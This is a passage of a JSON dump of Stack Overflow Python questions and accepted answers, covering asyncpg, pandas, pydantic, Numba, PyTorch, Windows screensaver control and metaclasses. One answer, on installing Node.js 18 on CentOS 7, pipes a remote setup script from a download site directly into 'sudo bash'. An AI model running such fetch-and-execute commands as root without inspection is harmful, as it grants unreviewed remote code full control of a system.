    "Body": "I want to test some function, that work with asyncpg. If I run one test at a time, it works fine. But if I run several tests at a time, all tests except the first one crash with the error asyncpg.exceptions._base.InterfaceError: cannot perform operation: another operation is in progress.\nTests:\n@pytest.mark.asyncio\nasync def test_project_connection(superuser_id, project_id):\n    data = element_data_random(project_id)\n\n    element_id = (await resolve_element_create(data=data, user_id=superuser_id))[\"id\"]\n    project_elements = (await db_projects_element_ids_get([project_id]))[project_id]\n\n    assert element_id in project_elements\n\n\n@pytest.mark.asyncio\nasync def test_project_does_not_exist(superuser_id):\n    data = element_data_random(str(uuid.uuid4()))\n\n    with pytest.raises(ObjectWithIdDoesNotExistError):\n        await resolve_element_create(data=data, user_id=superuser_id)\n\nAll functions for work with db use pool look like:\nasync def (*args):\n    pool = await get_pool()\n\n    await pool.execute(...) # or fetch/fetchrow/fetchval\n\nHow I get the pool:\ndb_pool = None\n\n\nasync def get_pool():\n    global db_pool\n\n    async def init(con):\n        await con.set_type_codec('jsonb', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')\n        await con.set_type_codec('json', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')\n\n    if not db_pool:\n        dockerfiles_dir = os.path.join(src_dir, 'dockerfiles')\n        env_path = os.path.join(dockerfiles_dir, 'dev.env')\n\n        try:\n            # When code and DB inside docker containers\n            host = 'postgres-docker'\n            socket.gethostbyname(host)\n        except socket.error:\n            # When code on localhost, but DB inside docker container\n            host = 'localhost'\n\n        load_dotenv(dotenv_path=env_path)\n\n        db_pool = await asyncpg.create_pool(\n            database=os.getenv(\"POSTGRES_DBNAME\"),\n            user=os.getenv(\"POSTGRES_USER\"),\n            password=os.getenv(\"POSTGRES_PASSWORD\"),\n            host=host,\n            init=init\n        )  \n\n    return db_pool\n\nAs far as I understand under the hood, asyn\u0441pg creates a new connection and runs the request inside that connection if you run the request through pool. Which makes it clear that each request should have its own connection. However, this error occurs, which is caused when one connection tries to handle two requests at the same time\n",
    "AcceptedAnswerId": 71966226,
    "AcceptedAnswer": "Okay, thanks to @Adelin I realized that I need to run each asynchronous test synchronously. I I'm new to asyncio so I didn't understand it right away and found a solution.\nIt was:\n@pytest.mark.asyncio\nasync def test_...(*args):\n    result = await \n\n    assert result == excepted_result\n\nIt become:\ndef test_...(*args):\n    async def inner()\n        result = await \n\n        assert result == excepted_result\n\n    asyncio.get_event_loop().run_until_complete(inner())\n\n"
}
{
    "Id": 73136808,
    "PostTypeId": 1,
    "Title": "AWS Glue error - Invalid input provided while running python shell program",
    "Body": "I have Glue job, a python shell code. When I try to run it I end up getting the below error.\nJob Name : xxxxx Job Run Id : yyyyyy failed to execute with exception Internal service error : Invalid input provided\nIt is not specific to code, even if I just put\nimport boto3\nprint('loaded')\n\nI am getting the error right after clicking the run job option. What is the issue here?\n",
    "AcceptedAnswerId": 73162640,
    "AcceptedAnswer": "I think Quatermass is right, the jobs started working out of the blue the next day without any changes.\n"
}
{
    "Id": 73242764,
    "PostTypeId": 1,
    "Title": "How to efficiently calculate membership counts by month and group",
    "Body": "I have to calculate in Python the number of unique active members by year, month, and group for a large dataset (N ~ 30M).  Membership always starts at the beginning of the month and ends at the end of the month. Here is a very small subset of the data.\nprint(df.head(6))\n   member_id  type  start_date    end_date\n1         10     A  2021-12-01  2022-05-31\n2         22     B  2022-01-01  2022-07-31\n3         17     A  2022-01-01  2022-06-30\n4         57     A  2022-02-02  2022-02-28\n5         41     B  2022-02-02  2022-04-30\n\nMy current solution is inefficient as it relies on a for loop:\nimport pandas as pd\n\n\ndate_list = pd.date_range(\n    start=min(df.start_date),\n    end=max(df.end_date),\n    freq='MS'\n)\nmembers = pd.DataFrame()\n\nfor d in date_list:\n    df['date_filter'] = (\n        (d >= df.start_date)\n        & (d <= df.end_date)\n    )\n    grouped_members = (\n         df\n         .loc[df.date_filter]\n         .groupby(by='type', as_index=False)\n         .member_id\n         .nunique()\n    )\n    member_counts = pd.DataFrame(\n         data={'year': d.year, 'month': d.month}\n         index=[0]\n    )\n     member_counts = member_counts.merge(\n         right=grouped_members,\n         how='cross'\n    )\n    members = pd.concat[members, member_counts]\nmembers = members.reset_index(drop=True)\n\nIt produces the following:\nprint(members)\n\n    year  month  type  member_id\n 0  2021     12     A          1\n 1  2021     12     B          0\n 2  2022      1     A          3\n 3  2022      1     B          1\n 4  2022      2     A          3\n 5  2022      2     B          2\n 6  2022      3     A          2\n 7  2022      3     B          2\n 8  2022      4     A          2\n 9  2022      4     B          2\n10  2022      5     A          2\n11  2022      5     B          1\n12  2022      6     A          1\n13  2022      6     B          1\n14  2022      7     A          0\n15  2022      7     B          1\n\nI'm looking for a completely vectorized solution to reduce computational time.\n",
    "AcceptedAnswerId": 73243551,
    "AcceptedAnswer": "Updated answer that avoids melt. Maybe faster? Uses the same idea as before where we don't actually care about member ids, we are just keeping track of start/end counts\n#Create multiindexed series for reindexing later\nmonths = pd.date_range(\n    start=df.start_date.min(),\n    end=df.end_date.max(),\n    freq='MS',\n).to_period('M')\n\nind = pd.MultiIndex.from_product([df.type.unique(),months],names=['type','month'])\n\n#push each end date to the next month\ndf['end_date'] += pd.DateOffset(1) \n\n#Convert the dates to yyyy-mm\ndf['start_date'] = df.start_date.dt.to_period('M')\ndf['end_date'] = df.end_date.dt.to_period('M')\n\n#Get cumsum counts per type/month of start and ends \ngb_counts = (\n    df.groupby('type').agg(\n        start = ('start_date','value_counts'),\n        end = ('end_date','value_counts'),\n    )\n    .reindex(ind)\n    .fillna(0)\n    .groupby('type')\n    .cumsum()\n    .astype(int)\n)\n\ncounts = (gb_counts.start-gb_counts.end).unstack()\ncounts\n\nORIGINAL\nUpdated answer than works unless the same member_id/group has overlapping date ranges (in which case it double-counts)\nThe idea is to keep track of when the number of users changes per group instead of exploding out all months per user.\nI think this should be very fast and I'm curious how it performs\nOutput\n\nCode (looks long but is mostly comments)\nimport pandas as pd\nimport itertools\n\n#Load example data\nimport io #just for reading in your example table\ndf = pd.read_csv(\n    io.StringIO(\"\"\"\n0  member_id  type  start_date    end_date\n1         10     A  2021-12-01  2022-05-31\n2         22     B  2022-01-01  2022-07-31\n3         17     A  2022-01-01  2022-06-30\n4         57     A  2022-02-02  2022-02-28\n5         41     B  2022-02-02  2022-04-30\n\"\"\"),\n    delim_whitespace=True,\n    index_col=0,\n    parse_dates=['start_date','end_date'],\n).reset_index(drop=True)\n\n#Create categorical index for reindexing and ffill\nmonths = pd.date_range(\n    start=df.start_date.min(),\n    end=df.end_date.max(),\n    freq='MS',\n).to_period('M')\n\ncat_ind = pd.Categorical(itertools.product(df.type.unique(),months))\n\n#push each end date to the next month\ndf['end_date'] += pd.DateOffset(1) \n\n#Convert the dates to yyyy-mm\ndf['start_date'] = df.start_date.dt.to_period('M')\ndf['end_date'] = df.end_date.dt.to_period('M')\n\n#Melt from:\n#\n#member_id | type | start_date |  end_date\n#----------|------|------------|-----------\n#       10 |   A  | 2021-12-01 | 2022-05-31\n# ...\n#\n#to\n#\n# type | active_users | date\n#----------------------------\n#    A |   start_date | 2021-12-01\n#    A |     end_date | 2022-05-31\n# ...\ndf = df.melt(\n    id_vars='type',\n    value_vars=['start_date','end_date'],\n    var_name='active_users',\n    value_name='date',\n).sort_values('date')\n\n#Replace var column with +1/-1 for start/end date rows\n#\n# type | active_users | date\n#----------------------------\n#    A |            1 | 2021-12-01\n#    A |           -1 | 2022-05-31\n# ...\ndf['active_users'] = df.active_users.replace({'start_date':1,'end_date':-1})\n\n#Sum within each type/date then cumsum the number of active users\ndf = df.groupby(['type','date']).sum().cumsum()\n\n#Reindex to ffill missing dates\ndf = df.reindex(cat_ind).ffill().astype(int)\n\ndf.unstack()\n\n"
}
{
    "Id": 72476094,
    "PostTypeId": 1,
    "Title": "pydantic.error_wrappers.ValidationError: 11 validation errors for For Trip type=value_error.missing",
    "Body": "Im getting this error with my pydantic schema, but oddly it is generating the object correctly, and sending it to the SQLAlchemy models, then it suddenly throws error for all elements in the model.\nresponse -> id\n  field required (type=value_error.missing)\nresponse -> date\n  field required (type=value_error.missing)\nresponse -> time\n  field required (type=value_error.missing)\nresponse -> price\n  field required (type=value_error.missing)\nresponse -> distance\n  field required (type=value_error.missing)\nresponse -> origin_id\n  field required (type=value_error.missing)\nresponse -> destination_id\n  field required (type=value_error.missing)\nresponse -> driver_id\n  field required (type=value_error.missing)\nresponse -> passenger_id\n  field required (type=value_error.missing)\nresponse -> vehicle_id\n  field required (type=value_error.missing)\nresponse -> status\n  field required (type=value_error.missing)\n\ni must say that all the fields should have values. And the error trace do not references any part of my code so i dont even know where to debug. Im a noob in SQLAlchemy/pydantic\nhere are some parts of the code\nclass Trip(BaseModel):\n    id: int\n    date: str\n    time: str\n    price: float\n    distance: float\n    origin_id: int\n    destination_id: int\n    driver_id: int\n    passenger_id: int\n    vehicle_id: int\n    status: Status\n\n    class Config:\n        orm_mode = True\n\nclass TripDB(Base):\n    __tablename__ = 'trip'\n    __table_args__ = {'extend_existing': True}\n    id = Column(Integer, primary_key=True, index=True)\n    date = Column(DateTime, nullable=False)\n    time = Column(String(64), nullable=False)\n    price = Column(Float, nullable=False)\n    distance = Column(Float, nullable=False)\n    status = Column(String(64), nullable=False)\n\n    origin_id = Column(\n        Integer, ForeignKey('places.id'), nullable=False)\n    destination_id = Column(\n        Integer, ForeignKey('places.id'), nullable=False)\n\n    origin = relationship(\"PlaceDB\", foreign_keys=[origin_id])\n    destination = relationship(\"PlaceDB\", foreign_keys=[destination_id])\n\n    driver_id = Column(\n        Integer, ForeignKey('driver.id'), nullable=False)\n    vehicle_id = Column(\n        Integer, ForeignKey('vehicle.id'), nullable=False)\n    passenger_id = Column(\n        Integer, ForeignKey('passenger.id'), nullable=False)\n\ndef create_trip(trip: Trip, db: Session):\n    origin = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.origin_id).first()\n    destination = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.destination_id).first()\n    db_trip = TripDB(\n        id=(trip.id or None),\n        date=trip.date or None, time=trip.time or None, price=trip.price or None, \n\n    distance=trip.distance or None, \n            origin_id=trip.origin_id or None, destination_id=(trip.destination_id or None), status=trip.status or None, \n            driver_id=trip.driver_id or None, passenger_id=trip.passenger_id or None, vehicle_id=trip.vehicle_id or None, origin=origin, destination=destination)\n    try:\n        db.add(db_trip)\n        db.commit()\n        db.refresh(db_trip)\n        return db_trip\n\n    except:\n        return \"Somethig went wrong\"\n\n\n",
    "AcceptedAnswerId": 72564863,
    "AcceptedAnswer": "It seems like a bug on the pydantic model, it happened to me as well, and i was not able to fix it, but indeed if you just skip the type check in the route it works fine\n"
}
{
    "Id": 71984449,
    "PostTypeId": 1,
    "Title": "How to add an extra middle step into a list comprehension?",
    "Body": "Let's say I have a list[str] object containing timestamps in \"HH:mm\" format, e.g.\ntimestamps = [\"22:58\", \"03:11\", \"12:21\"]\n\nI want to convert it to a list[int] object with the \"number of minutes since midnight\" values for each timestamp:\nconverted = [22*60+58, 3*60+11, 12*60+21]\n\n... but I want to do it in style and use a single list comprehension to do it. A (syntactically incorrect) implementation that I naively constructed was something like:\ndef timestamps_to_minutes(timestamps: list[str]) -> list[int]:\n    return [int(hh) * 60 + int(mm) for ts in timestamps for hh, mm = ts.split(\":\")]\n\n... but this doesn't work because for hh, mm = ts.split(\":\") is not a valid syntax.\nWhat would be the valid way of writing the same thing?\nTo clarify: I can see a formally satisfying solution in the form of:\ndef timestamps_to_minutes(timestamps: list[str]) -> list[int]:\n    return [int(ts.split(\":\")[0]) * 60 + int(ts.split(\":\")[1]) for ts in timestamps]\n\n... but this is highly inefficient and I don't want to split the string twice.\n",
    "AcceptedAnswerId": 71984511,
    "AcceptedAnswer": "You could use an inner generator expression to do the splitting:\n[int(hh)*60 + int(mm) for hh, mm in (ts.split(':') for ts in timestamps)]\n\n\nAlthough personally, I'd rather use a helper function instead:\ndef timestamp_to_minutes(timestamp: str) -> int:\n    hh, mm = timestamp.split(\":\")\n    return int(hh)*60 + int(mm)\n\n[timestamp_to_minutes(ts) for ts in timestamps]\n\n# Alternative\nlist(map(timestamp_to_minutes, timestamps))\n\n"
}
{
    "Id": 71563696,
    "PostTypeId": 1,
    "Title": "Pandas to_gbq() TypeError \"Expected bytes, got a 'int' object",
    "Body": "I am using the pandas_gbq module to try and append a dataframe to a table in Google BigQuery.\nI keep getting this error:\n\nArrowTypeError: Expected bytes, got a 'int' object.\n\nI can confirm the data types of the dataframe match the schema of the BQ table.\nI found this post regarding Parquet files not being able to have mixed datatypes: Pandas to parquet file\nIn the error message I'm receiving, I see there is a reference to a Parquet file, so I'm assuming the df.to_gbq() call is creating a Parquet file and I have a mixed data type column, which is causing the error. The error message doesn't specify.\nI think that my challenge is that I can't see to find which column has the mixed datatype - I've tried casting them all as strings and then specifying the table schema parameter, but that hasn't worked either.\nThis is the full error traceback:\nIn [76]: df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')\nArrowTypeError                            Traceback (most recent call last)\n in \n----> 1 df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')\n\n~\\Anaconda3\\lib\\site-packages\\pandas\\core\\frame.py in to_gbq(self, destination_table, \nproject_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, \nprogress_bar, credentials)\n   1708         from pandas.io import gbq\n   1709\n-> 1710         gbq.to_gbq(\n   1711             self,\n   1712             destination_table,\n\n~\\Anaconda3\\lib\\site-packages\\pandas\\io\\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials)\n    209 ) -> None:\n    210     pandas_gbq = _try_import()\n--> 211     pandas_gbq.to_gbq(\n    212         dataframe,\n    213         destination_table,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials, api_method, verbose, private_key)\n   1191         return\n   1192\n-> 1193     connector.load_data(\n   1194         dataframe,\n   1195         destination_table_ref,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\gbq.py in load_data(self, dataframe, destination_table_ref, chunksize, schema, progress_bar, api_method, billing_project)\n    584\n    585         try:\n--> 586             chunks = load.load_chunks(\n    587                 self.client,\n    588                 dataframe,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\load.py in load_chunks(client, dataframe, destination_table_ref, chunksize, schema, location, api_method, billing_project)\n    235 ):\n    236     if api_method == \"load_parquet\":\n--> 237         load_parquet(\n    238             client,\n    239             dataframe,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\load.py in load_parquet(client, dataframe, destination_table_ref, location, schema, billing_project)\n    127\n    128     try:\n--> 129         client.load_table_from_dataframe(\n    130             dataframe,\n    131             destination_table_ref,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\client.py in load_table_from_dataframe(self, dataframe, destination, num_retries, job_id, job_id_prefix, location, project, job_config, parquet_compression, timeout)\n   2669                         parquet_compression = parquet_compression.upper()\n   2670\n-> 2671                     _pandas_helpers.dataframe_to_parquet(\n   2672                         dataframe,\n   2673                         job_config.schema,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in dataframe_to_parquet(dataframe, bq_schema, filepath, parquet_compression, parquet_use_compliant_nested_type)\n    584\n    585     bq_schema = schema._to_schema_fields(bq_schema)\n--> 586     arrow_table = dataframe_to_arrow(dataframe, bq_schema)\n    587     pyarrow.parquet.write_table(\n    588         arrow_table, filepath, compression=parquet_compression, **kwargs,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in dataframe_to_arrow(dataframe, bq_schema)\n    527         arrow_names.append(bq_field.name)\n    528         arrow_arrays.append(\n--> 529             bq_to_arrow_array(get_column_or_index(dataframe, bq_field.name), bq_field)\n    530         )\n    531         arrow_fields.append(bq_to_arrow_field(bq_field, arrow_arrays[-1].type))\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in bq_to_arrow_array(series, bq_field)\n    288     if field_type_upper in schema._STRUCT_TYPES:\n    289         return pyarrow.StructArray.from_pandas(series, type=arrow_type)\n--> 290     return pyarrow.Array.from_pandas(series, type=arrow_type)\n    291\n    292\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib.Array.from_pandas()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib.array()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib._ndarray_to_array()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\error.pxi in pyarrow.lib.check_status()\n\nArrowTypeError: Expected bytes, got a 'int' object\n\n",
    "AcceptedAnswerId": 73284286,
    "AcceptedAnswer": "Had this same issue - solved it simply with\ndf = df.astype(str)\n\nand doing to_gbq on that instead.\nCaveat is that all your fields will now be strings...\n"
}
{
    "Id": 72269651,
    "PostTypeId": 1,
    "Title": "Numpy way of splitting array when cumaltive sum > x",
    "Body": "Data\nLets take the following 2d array:\nstarts = [0, 4, 10, 13, 23, 27]\nends = [4, 10, 13, 23, 27, 32]\nlengths = [4, 6, 3, 10, 4, 5] \n\narr = np.array([starts, ends, lengths]).T\n\nThus looking like:\n[[ 0  4  4]\n [ 4 10  6]\n [10 13  3]\n [13 23 10]\n [23 27  4]\n [27 32  5]]\n\n\nGoal\nNow I want to \"loop\" through the lengths and as soon as soon as the cumaltive sum reaches 10 I want to output the starts and ends and then restart the cumulative counting.\n\nWorking code\ntot_size = 0\nstart = 0\n\nfor i, numb in enumerate(arr[:,-1]):\n    # update sum\n    tot_size += numb\n\n    # Check if target size is reached\n    if tot_size >= 10:\n        start_loc, end_loc = arr[:,0][start],  arr[:,1][i]\n        print('Start: {}\\nEnd: {}\\nSum: {}\\n'.format(start_loc, end_loc, tot_size))\n        start = i + 1\n        tot_size = 0\n\n# Last part\nstart_loc, end_loc = arr[:,0][start],  arr[:,1][i]\nprint('Start: {}\\nEnd: {}\\nSum: {}\\n'.format(start_loc, end_loc, tot_size))\n\nWhich will print:\n\nStart: 0 End: 10 Sum: 10\nStart: 10 End: 23 Sum: 13\nStart: 23 End: 32 Sum: 9\n\n(I don't need to know the resulting sum but I do need to know the starts and ends)\n\nNumpy try\nI suppose there must be a much more straightforward, or a vectorized, way of doing this with numpy.\n\ncumsum + remainder\n\nI was thinking of something like np.remainder(np.cumsum(arr[:,-1]), 10) however it will be \"hard\" to say when something is close to the target number (10 here), which is different from just splitting when sum > x\n\nstride_tricks\n\nSince the above doesn't work in a window I thought of stides but these windows are of fixed sizes\nAll ideas are welcome :)\n",
    "AcceptedAnswerId": 72279421,
    "AcceptedAnswer": "Numpy is not designed for solving efficiently such a problem. You can still solve this using some tricks or the usual combination of cumsum + division + diff + where or similar ones (like @Kevin proposed), but AFAIK they are all inefficient. Indeed, they require many temporary arrays and expensive operations.\nTemporary arrays are expensive for two reasons: for small arrays, the overhead of Numpy function is typically of several microseconds per call resulting in generally in dozens of microseconds for the whole operation; and for big arrays, each operation will be memory bound and memory bandwidth is small on modern platforms. Actually, it is even worst since writing in newly allocated array is much slower due to page faults and Numpy array writes are currently not optimized on most platforms (including the mainstream x86-64 one).\nAs for \"expensive operations\" this includes sorting which runs in O(n log n) (quick-sort is used by default) and is generally memory bound, finding the unique values (which currently does a sort internally) and integer division which is known to be very slow since ever.\n\nOne solution to solve this problem is to use Numba (or Cython). Numba use a just-in-time compiler so to write fast optimized function. It is especially useful to write your own efficient basic Numpy built-ins. Here is an example based on your code:\nimport numba as nb\nimport numpy as np\n\n@nb.njit(['(int32[:,:],)', '(int64[:,:],)'])\ndef compute(arr):\n    n = len(arr)\n    tot_size, start, cur = 0, 0, 0\n    slices = np.empty((n, 2), arr.dtype)\n\n    for i in range(n):\n        tot_size += arr[i, 2]\n\n        if tot_size >= 10:\n            slices[cur, 0] = arr[start, 0]\n            slices[cur, 1] = arr[i, 1]\n            start = i + 1\n            cur += 1\n            tot_size = 0\n\n    slices[cur, 0] = arr[start, 0]\n    slices[cur, 1] = arr[i, 1]\n    return slices[:cur+1]\n\nFor your small example, the Numba function takes about 0.75 us on my machine while the initial solution takes 3.5 us. In comparison, the Numpy solutions provided by @Kevin (returning the indices) takes 24 us for the np.unique and 6 us for the division-based solution. In fact, the basic np.cumsum already takes 0.65 us on my machine. Thus, the Numba solution is the fastest. It should be especially true for larger arrays.\n"
}
{
    "Id": 72425408,
    "PostTypeId": 1,
    "Title": "Interrupt (NOT prevent from starting) screensaver",
    "Body": "I am trying to programmatically interrupt the screensaver by moving the cursor like this:\nwin32api.SetCursorPos((random.choice(range(100)),random.choice(range(100))))\n\nAnd it fails with the message:\npywintypes.error: (0, 'SetCursorPos', 'No error message is available')\n\nThis error only occurs if the screensaver is actively running.\nThe reason for this request is that the computer is ONLY used for inputting data through a bluetooth device (via a Python program). When the BT device sends data to the computer the screensaver is not interrupted (which means I cannot see the data the BT device sent). Thus, when the Python program receives data from the BT device it is also supposed to interrupt the screensaver.\nI have seen several solution on how to prevent the screensaver from starting (which are not suitable solutions in my case), but none on how to interrupt a running screensaver. How can I do this, using Windows\u00a010 and Python 3.10?\n",
    "AcceptedAnswerId": 73286378,
    "AcceptedAnswer": "The Windows operating system has a hierarchy of objects.  At the top of the hierarchy is the \"Window Station\".  Just below that is the \"Desktop\" (not to be confused with the desktop folder, or even the desktop window showing the icons of that folder).  You can read more about this concept in the documentation.\nI mention this because ordinarily only one Desktop can receive and process user input at any given time.  And, when a screen saver is activated by Windows due to a timeout, Windows creates a new Desktop to run the screen saver.\nThis means any application associated with any other Desktop, including your Python script, will be unable to send input to the new Desktop without some extra work.  The nature of that work depends on a few factors.  Assuming the simplest case, a screen saver that's created without the \"On resume, display logon screen\", and no other Window Station has been created by a remote connection or local user login, then you can ask Windows for the active Desktop, attach the Python script to that Desktop, move the mouse, and revert back to the previous Desktop so the rest of the script works as expected.\nThankfully, the code to do this is easier than the explanation:\nimport win32con, win32api, win32service\nimport random\n# Get a handle to the current active Desktop\nhdesk = win32service.OpenInputDesktop(0, False, win32con.MAXIMUM_ALLOWED);\n# Get a handle to the Desktop this process is associated with\nhdeskOld = win32service.GetThreadDesktop(win32api.GetCurrentThreadId())\n# Set this process to handle messages and input on the active Desktop\nhdesk.SetThreadDesktop()\n# Move the mouse some random amount, most Screen Savers will react to this,\n# close the window, which in turn causes Windows to destroy this Desktop\n# Also, move the mouse a few times to avoid the edge case of moving\n# it randomly to the location it was already at.\nfor _ in range(4):\n    win32api.SetCursorPos((random.randint(0, 100), random.randint(0, 100)))\n# Revert back to the old desktop association so the rest of this script works\nhdeskOld.SetThreadDesktop()\n\nHowever, if the screen saver is running on a separate Window Station because \"On resume, display logon screen\" is selected, or another user is connected either via the physical Console or has connected remotely, then connecting to and attaching to the active Desktop will require elevation of the Python script, and even then, depending on other factors, it may require special permissions.\nAnd while this might help your specific case, I will add the the core issue in the general case is perhaps more properly defined as asking \"how do I notify the user of the state of something, without the screen saver blocking that notification?\".  The answer to that question isn't \"cause the screen saver to end\", but rather \"Use something like SetThreadExecutionState() with ES_DISPLAY_REQUIRED to keep the screen saver from running.  And show a full-screen top-most window that shows the current status, and when you want to alert the user, flash an eye-catching graphic and/or play a sound to get their attention\".\nHere's what that looks like, using tkinter to show the window:\nfrom datetime import datetime, timedelta\nimport ctypes\nimport tkinter as tk\n\n# Constants for calling SetThreadExecutionState\nES_CONTINUOUS = 0x80000000\nES_SYSTEM_REQUIRED = 0x00000001\nES_DISPLAY_REQUIRED= 0x00000002\n\n# Example work, show nothing, but when the timer hits, \"alert\" the user\nALERT_AT = datetime.utcnow() + timedelta(minutes=2)\n\ndef timer(root):\n    # Called every second until we alert the user\n    # TODO: This is just alerting the user after a set time goes by,\n    #       you could perform a custom check here, to see if the user\n    #       should be alerted based off other conditions.\n    if datetime.utcnow() >= ALERT_AT:\n        # Just alert the user\n        root.configure(bg='red')\n    else:\n        # Nothing to do, check again in a bit\n        root.after(1000, timer, root)\n\n# Create a full screen window\nroot = tk.Tk()\n# Simple way to dismiss the window\nroot.bind(\"\", lambda e: e.widget.destroy())\nroot.wm_attributes(\"-fullscreen\", 1)\nroot.wm_attributes(\"-topmost\", 1)\nroot.configure(bg='black')\nroot.config(cursor=\"none\")\nroot.after(1000, timer, root)\n# Disable the screen saver while the main window is shown\nctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED)\nroot.mainloop()\n# All done, let the screen saver run again\nctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)\n\nWhile more work, doing this will solve issues around the secure desktop with \"On resume, display logon screen\" set, and also prevent the system from going to sleep if it's configured to do so.  It just generally allows the application to more clearly communicate its intention.\n"
}
{
    "Id": 73325131,
    "PostTypeId": 1,
    "Title": "How to set all elements of pytorch tensor to zero after a certain index in the given axis, where the index is given by another pytorch tensor?",
    "Body": "I've two PyTorch tensors\nmask = torch.ones(1024, 64, dtype=torch.float32)\nindices = torch.randint(0, 64, (1024, ))\n\nFor every ith row in mask, I want to set all the elements after the index specified by ith element of indices to zero. For example, if the first element of indices is 50, then I want to set mask[0, 50:]=0. Is it possible to achieve this without using for loop?\nSolution with for loop:\nfor i in range(mask.shape[0]):\n    mask[i, indices[i]:] = 0\n\n",
    "AcceptedAnswerId": 73326058,
    "AcceptedAnswer": "You can first generate a tensor of size (1024x64) where each row has numbers arranged from 0 to 63. Then apply a logical operation using the indices reshaped as (1024x1)\nmask = torch.ones(1024, 64, dtype=torch.float32)\nindices = torch.randint(0, 64, (1024, 1))    # Note the dimensions\n\nmask[torch.arange(0, 64, dtype=torch.float32).repeat(1024,1) >= indices] = 0\n\n"
}
{
    "Id": 72571235,
    "PostTypeId": 1,
    "Title": "Can I install node.js 18 on Centos 7 and do I need python 3 install too?",
    "Body": "I'm not sure if node.js 18 supports centos 7 and is it a requirement to install python 3 for node.js 18?\n",
    "AcceptedAnswerId": 72571789,
    "AcceptedAnswer": "Step 1 - curl --silent --location https://rpm.nodesource.com/setup_18.x | sudo bash -\nStep 2 - sudo yum -y install nodejs\nI don't think you need Python 3.\nReference - https://computingforgeeks.com/install-node-js-on-centos-rhel-rocky-linux/\n"
}
{
    "Id": 72280047,
    "PostTypeId": 1,
    "Title": "How can I override a special method defined in a metaclass with a custom classmethod?",
    "Body": "As an example, consider the following:\nclass FooMeta(type):\n    def __len__(cls):\n        return 9000\n\n\nclass GoodBar(metaclass=FooMeta):\n    def __len__(self):\n        return 9001\n\n\nclass BadBar(metaclass=FooMeta):\n    @classmethod\n    def __len__(cls):\n        return 9002\n\nlen(GoodBar) -> 9000\nlen(GoodBar()) -> 9001\nGoodBar.__len__() -> TypeError (missing 1 required positional argument)\nGoodBar().__len__() -> 9001\nlen(BadBar) -> 9000 (!!!)\nlen(BadBar()) -> 9002\nBadBar.__len__() -> 9002\nBadBar().__len__() -> 9002\n\nThe issue being with len(BadBar) returning 9000 instead of 9002 which is the intended behaviour.\nThis behaviour is (somewhat) documented in Python Data Model - Special Method Lookup, but it doesn't mention anything about classmethods, and I don't really understand the interaction with the @classmethod decorator.\nAside from the obvious metaclass solution (ie, replace/extend FooMeta) is there a way to override or extend the metaclass function so that len(BadBar) -> 9002?\nEdit:\nTo clarify, in my specific use case I can't edit the metaclass, and I don't want to subclass it and/or make my own metaclass, unless it is the only possible way of doing this.\n",
    "AcceptedAnswerId": 72281211,
    "AcceptedAnswer": "The __len__ defined in the class will always be ignored when using len(...) for the class itself:  when executing its operators, and methods like \"hash\", \"iter\", \"len\" can be roughly said to have \"operator status\", Python always retrieve the corresponding method from the class of the target,  by directly acessing the memory structure of the class. These dunder methods have \"physical\" slot in the memory layout for the class: if the method exists in the class of your instance (and in this case, the \"instances\" are the classes \"GoodBar\" and \"BadBar\", instances of \"FooMeta\"), or one of its superclasses, it is called - otherwise the operator fails.\nSo, this is the reasoning that applies on len(GoodBar()): it will call the __len__ defined in GoodBar()'s class, and len(GoodBar) and len(BadBar) will call the __len__ defined in their class, FooMeta\n\nI don't really understand the interaction with the @classmethod\ndecorator.\n\nThe \"classmethod\" decorator creates a special descriptor out of the decorated function, so that when it is retrieved, via \"getattr\" from the class it is bound too, Python creates a \"partial\" object with the \"cls\" argument already in place. Just as retrieving an ordinary method from an instance creates an object with \"self\" pre-bound:\nBoth things are carried through the \"descriptor\" protocol - which means, both an ordinary method and a classmethod are retrieved by calling its __get__ method. This method takes 3 parameters: \"self\", the descriptor itself, \"instance\", the instance its bound to, and \"owner\": the class it is ound to. The thing is that for ordinary methods (functions), when the second (instance) parameter to __get__ is None, the function itself is returned. @classmethod wraps a function with an object with a different __get__: one that returns the equivalent to partial(method, cls), regardless of the second parameter to __get__.\nIn other words, this simple pure Python code replicates the working of the classmethod decorator:\nclass myclassmethod:\n    def __init__(self, meth):\n         self.meth = meth\n    def __get__(self, instance, owner):\n         return lambda *args, **kwargs: self.meth(owner, *args, **kwargs)\n\nThat is why you see the same behavior when calling a classmethod explicitly with klass.__get__() and klass().__get__(): the instance is ignored.\nTL;DR: len(klass)  will always go through the metaclass slot, and klass.__len__() will retrieve __len__  via the getattr mechanism, and then bind the classmethod properly before calling it.\n\nAside from the obvious metaclass solution (ie, replace/extend FooMeta)\nis there a way to override or extend the metaclass function so that\nlen(BadBar) -> 9002?\n\n\n(...)\nTo clarify, in my specific use case I can't edit the metaclass, and I\ndon't want to subclass it and/or make my own metaclass, unless it is\nthe only possible way of doing this.\n\nThere is no other way. len(BadBar) will always go through the metaclass __len__.\nExtending the 